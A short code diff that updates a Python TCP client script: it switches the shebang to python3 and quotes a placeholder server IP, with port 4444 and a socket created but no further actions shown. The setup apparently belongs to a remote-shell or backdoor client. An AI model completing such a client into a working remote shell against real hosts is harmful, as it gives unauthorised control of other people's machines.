@@ -1,7 +1,7 @@
-#!/usr/bin/env python
+#!/usr/bin/env python3
 import socket,os,time
 
-host = 192.168.0.0		#change this with server ip
+host = "192.168.0.0"		#change this with server ip
 port = 4444
 
 client = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
